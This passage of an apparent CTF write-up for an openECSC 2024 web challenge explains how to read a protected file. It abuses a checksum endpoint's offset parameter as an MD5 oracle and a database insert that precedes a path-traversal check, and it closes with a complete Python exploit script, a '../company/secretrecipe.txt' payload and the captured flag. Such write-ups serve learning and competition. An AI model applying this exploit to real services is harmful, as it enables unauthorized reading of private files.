" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <h1 id="how-to-read-secretrecipetxt"><a class="anchor" aria-hidden="true" tabindex="-1" href="#how-to-read-secretrecipetxt"><span class="octicon octicon-link"></span></a>How to read secretrecipe.txt</h1>
    <p>Initially I didn't know how to go on about reading the contents of <code>secretrecipe.txt</code>, almost all endpoints have checks for the file id, you can't upload stuff like php and get RCE nor is there a bot to XSS on. Then I started thinking backwards, because even if I managed to get a file handler that points to <code>/company/secretrecipe.txt</code>, I couldn't read its contents normally due to this check</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">if</span> files<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"metadata"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> res<span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="2">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">403</span>
</span></code><div onclick="copied(this)" data-code="if files[-1][&#x22;metadata&#x22;][&#x22;filename&#x22;] in res[&#x22;filename&#x22;]:
        return &#x22;&#x22;, 403
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>But then, looking at this endpoint I remembered that this doesn't contain the same check as above, so it could prove to be useful.</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">"/files/&#x3C;id>/checksum"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="2"><span class="token keyword">def</span> <span class="token function">get_file_integrity</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="3">    <span class="token keyword">if</span> <span class="token builtin">id</span> <span class="token operator">==</span> <span class="token string">"ea41c85c-3db0-4ded-aff1-a93994f64d81"</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="4">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">403</span>
</span><span class="code-line line-number" line="5">    res <span class="token operator">=</span> metadata<span class="token punctuation">.</span>find_one<span class="token punctuation">(</span><span class="token punctuation">{</span>
</span><span class="code-line line-number" line="6">        <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">"$eq"</span><span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">}</span>
</span><span class="code-line line-number" line="7">    <span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="8">    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="9">        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">404</span>
</span><span class="code-line line-number" line="10">    m <span class="token operator">=</span> FileMetadata<span class="token punctuation">(</span>
</span><span class="code-line line-number" line="11">        res<span class="token punctuation">[</span><span class="token string">"author"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="12">        res<span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="13">        res<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="14">        <span class="token builtin">id</span><span class="token operator">=</span>res<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
</span><span class="code-line line-number" line="15">    <span class="token punctuation">)</span>
</span><span class="code-line line-number" line="16">    content <span class="token operator">=</span> m<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"offset"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="17">    <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">"checksum"</span><span class="token punctuation">:</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
</span></code><div onclick="copied(this)" data-code="@app.get(&#x22;/files/<id>/checksum&#x22;)
def get_file_integrity(id):
    if id == &#x22;ea41c85c-3db0-4ded-aff1-a93994f64d81&#x22;:
        return &#x22;&#x22;, 403
    res = metadata.find_one({
        &#x22;id&#x22;: {&#x22;$eq&#x22;: id}
    })
    if res is None:
        return &#x22;&#x22;, 404
    m = FileMetadata(
        res[&#x22;author&#x22;],
        res[&#x22;filename&#x22;],
        res[&#x22;description&#x22;],
        id=res[&#x22;id&#x22;],
    )
    content = m.read(int(request.args.get(&#x22;offset&#x22;, 0)))
    return {&#x22;checksum&#x22;: hashlib.md5(content.encode()).hexdigest()}
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>Here the app queries the db for the supplied id and if it exists it creates a FileMetadata object and reads its content beginning at <code>offset</code> which we provide through the GET parameters. Then the app returns the md5 hash of the content.</p>
    <p>This instantly reminded me of a XSLeak technique of bruteforcing each character by making a query to an oracle endpoint: if we set <code>offset</code> to be more than the length of the file, <code>content</code> will be an empty string and the returned MD5 hash will be <code>d41d8cd98f00b204e9800998ecf8427e</code>.</p>
    <p>Using this knowledge we can bruteforce each character by starting the offset at a high number and going backwards, slowly constructing the content letter by letter until we reach 0:</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">for</span> letter <span class="token keyword">in</span> ALPHABET<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="2">    content <span class="token operator">=</span> letter <span class="token operator">+</span> content
</span><span class="code-line line-number" line="3">    tent <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="4">    <span class="token keyword">if</span> tent<span class="token operator">==</span>response<span class="token punctuation">[</span><span class="token string">'checksum'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="5">        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="6">        <span class="token keyword">break</span>
</span><span class="code-line line-number" line="7">    content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
</span></code><div onclick="copied(this)" data-code="for letter in ALPHABET:
    content = letter + content
    tent = hashlib.md5(content.encode()).hexdigest()
    if tent==response[&#x27;checksum&#x27;]:
        print(content)
        break
    content = content[1:]
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>So we have a way to read the contents of <code>secretrecipe.txt</code>, the only problem is getting a FileMetadata object with an id that's not one of the forbidden ids and having filename equal to <code>/company/secretrecipe.txt</code></p>
    <h1 id="getting-a-handler-to-companysecretrecipetxt"><a class="anchor" aria-hidden="true" tabindex="-1" href="#getting-a-handler-to-companysecretrecipetxt"><span class="octicon octicon-link"></span></a>Getting a handler to /company/secretrecipe.txt</h1>
    <p>
      The next question is, how do we get a handler to the secret file?
      The only way we have to create a FileMetadata object and adding it to the db is through the POST request to <code>/api/v1/files</code> or the PUT request to <code>/api/v1/files/&#x3C;id></code>, which creates our handler and calls the FileMetadata write function. So even if we manage to bypass the checks and upload a file with a filename like <code>../company/secretrecipe.txt</code>, the app would overwrite the contents of <code>secretrecipe.txt</code> and we don't want that. So we have to create an entry in the db having an id not in the forbidden ids, having the filename equal to the path to <code>secretrecipe.txt</code> while also not writing to it... Is it possible?
    </p>
    <p>As it turns out, the answer is yes! Looking again at the FileMetadata write function</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> collection<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="2">        <span class="token keyword">if</span> self<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> forbidden_ids <span class="token keyword">and</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>init<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="3">            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Use of forbidden id"</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="4">
</span><span class="code-line line-number" line="5">        collection<span class="token punctuation">.</span>insert_one<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="6">
</span><span class="code-line line-number" line="7">        <span class="token keyword">if</span> <span class="token string">"./"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>path<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="8">            <span class="token keyword">raise</span> PathTraversalAttemptDetectedException<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="9">        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">200</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="10">            <span class="token keyword">raise</span> FileTooBigException<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="11">        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="12">            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="def write(self, collection, content):
        if self.id in forbidden_ids and not self.init:
            raise ValueError(&#x22;Use of forbidden id&#x22;)

        collection.insert_one(vars(self))

        if &#x22;./&#x22; in self.path:
            raise PathTraversalAttemptDetectedException()
        if len(content) > 200:
            raise FileTooBigException()
        with open(self.path, &#x22;w&#x22;) as f:
            f.write(content)
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <p>we can see that the app adds our file to the db <em>before</em> the checks, enabling us to create an entry in the db even if it contains <code>./</code> in <code>self.path</code>, and most importantly it does not continue with the writing of the file since the application will throw an error.</p>
    <h1 id="putting-it-all-together"><a class="anchor" aria-hidden="true" tabindex="-1" href="#putting-it-all-together"><span class="octicon octicon-link"></span></a>Putting it all together</h1>
    <p>Using all of the knowledge we acquired we can exploit this challenge. We make a PUT request to <code>/api/v1/files/{random_uid}</code> with filename <code>../company/secretrecipe.txt</code>, and we should get a 500 Internal Server Error, then we bruteforce the file's content through the <code>/api/v1/{same_random_uid}/checksum?offset=</code> starting the offset at a reasonably high value and going down to 0.</p>
    <p>It works! And we get the flag <code>openECSC{B377eR_7o_nO7_kNow_7h3_Tru7H_c15eb4b5}</code></p>
    <p>Here's the exploit:</p>
    <pre class="language-python"><code class="language-python code-highlight"><span class="code-line line-number" line="1"><span class="token keyword">import</span> requests
</span><span class="code-line line-number" line="2"><span class="token keyword">import</span> hashlib
</span><span class="code-line line-number" line="3"><span class="token keyword">import</span> string
</span><span class="code-line line-number" line="4"><span class="token keyword">import</span> json
</span><span class="code-line line-number" line="5">
</span><span class="code-line line-number" line="6"><span class="token keyword">def</span> <span class="token function">put_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="7">    URL <span class="token operator">=</span> <span class="token string">"http://slurm.challs.open.ecsc2024.it/api/v1/files/ef411dab-8b8d-45a1-9de4-a9614d533999"</span> <span class="token comment">#../company/secretrecipe.txt</span>
</span><span class="code-line line-number" line="8">
</span><span class="code-line line-number" line="9">    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span>URL<span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"author"</span><span class="token punctuation">:</span><span class="token string">"Valeryum999"</span><span class="token punctuation">,</span><span class="token string">"filename"</span><span class="token punctuation">:</span><span class="token string">"../company/secretrecipe.txt"</span><span class="token punctuation">,</span><span class="token string">"content"</span><span class="token punctuation">:</span><span class="token string">"ez"</span><span class="token punctuation">,</span><span class="token string">"description"</span><span class="token punctuation">:</span><span class="token string">"lmao"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="10">    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="11">    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="12">
</span><span class="code-line line-number" line="13"><span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="14">    ALPHABET <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> <span class="token string">"0123456789_-!{}()?"</span>
</span><span class="code-line line-number" line="15">    content <span class="token operator">=</span> <span class="token string">""</span>
</span><span class="code-line line-number" line="16">    <span class="token keyword">for</span> number <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="17">        URL <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://slurm.challs.open.ecsc2024.it/api/v1/files/</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">id</span><span class="token punctuation">}</span></span><span class="token string">/checksum?offset=</span><span class="token interpolation"><span class="token punctuation">{</span>number<span class="token punctuation">}</span></span><span class="token string">"</span></span>
</span><span class="code-line line-number" line="18">        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="19">        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="20">        response <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="21">        <span class="token keyword">if</span> response<span class="token punctuation">[</span><span class="token string">'checksum'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="22">            <span class="token keyword">continue</span>
</span><span class="code-line line-number" line="23">        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="24">        <span class="token keyword">for</span> letter <span class="token keyword">in</span> ALPHABET<span class="token punctuation">:</span>
</span><span class="code-line line-number" line="25">            content <span class="token operator">=</span> letter <span class="token operator">+</span> content
</span><span class="code-line line-number" line="26">            tent <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="27">            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Try:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="28">            <span class="token keyword">if</span> tent<span class="token operator">==</span>response<span class="token punctuation">[</span><span class="token string">'checksum'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
</span><span class="code-line line-number" line="29">                <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
</span><span class="code-line line-number" line="30">                <span class="token keyword">break</span>
</span><span class="code-line line-number" line="31">            content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
</span><span class="code-line line-number" line="32">
</span><span class="code-line line-number" line="33">put_file<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line line-number" line="34">bruteforce<span class="token punctuation">(</span><span class="token string">"ef411dab-8b8d-45a1-9de4-a9614d533999"</span><span class="token punctuation">)</span>
</span></code><div onclick="copied(this)" data-code="import requests
import hashlib
import string
import json

def put_file():
    URL = &#x22;http://slurm.challs.open.ecsc2024.it/api/v1/files/ef411dab-8b8d-45a1-9de4-a9614d533999&#x22; #../company/secretrecipe.txt

    response = requests.put(URL,json={&#x22;author&#x22;:&#x22;Valeryum999&#x22;,&#x22;filename&#x22;:&#x22;../company/secretrecipe.txt&#x22;,&#x22;content&#x22;:&#x22;ez&#x22;,&#x22;description&#x22;:&#x22;lmao&#x22;})
    print(response)
    print(response.text)

def bruteforce(id):
    ALPHABET = string.ascii_letters + &#x22;0123456789_-!{}()?&#x22;
    content = &#x22;&#x22;
    for number in range(50,-1,-1):
        URL = f&#x22;http://slurm.challs.open.ecsc2024.it/api/v1/files/{id}/checksum?offset={number}&#x22;
        response = requests.get(URL)
        print(response.text)
        response = json.loads(response.text)
        if response[&#x27;checksum&#x27;]==&#x22;&#x22;:
            continue
        print(response)
        for letter in ALPHABET:
            content = letter + content
            tent = hashlib.md5(content.encode()).hexdigest()
            print(&#x22;[+] Try:&#x22;,content)
            if tent==response[&#x27;checksum&#x27;]:
                print(content)
                break
            content = content[1:]

put_file()
bruteforce(&#x22;ef411dab-8b8d-45a1-9de4-a9614d533999&#x22;)
" class="copied"><svg class="octicon-copy" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path></svg><svg class="octicon-check" aria-hidden="true" viewBox="0 0 16 16" fill="currentColor" height="12" width="12"><path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg></div></pre>
    <script>/*! @uiw/copy-to-clipboard v1.0.12 | MIT (c) 2021 Kenny Wang | https://github.com/uiwjs/copy-to-clipboard.git */
!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):(e="undefined"!=typeof globalThis?globalThis:e||self).copyTextToClipboard=t()}(this,(function(){"use strict";return function(e,t){const o=document.createElement("textarea");o.value=e,o.setAttribute("readonly",""),o.style={position:"absolute",left:"-9999px"},document.body.appendChild(o);const n=document.getSelection().rangeCount>0&&document.getSelection().getRangeAt(0);o.select();let c=!1;try{c=!!document.execCommand("copy")}catch(e){c=!1}document.body.removeChild(o),n&&document.getSelection&&(document.getSelection().removeAllRanges(),document.getSelection().addRange(n)),t&&t(c)}}));

function copied(target, str) {
  target.classList.add('active');
  copyTextToClipboard(target.dataset.code, function() {
    setTimeout(() => {
      target.classList.remove('active');
    }, 2000);
  });
}</script>
  </div></body>
</html>
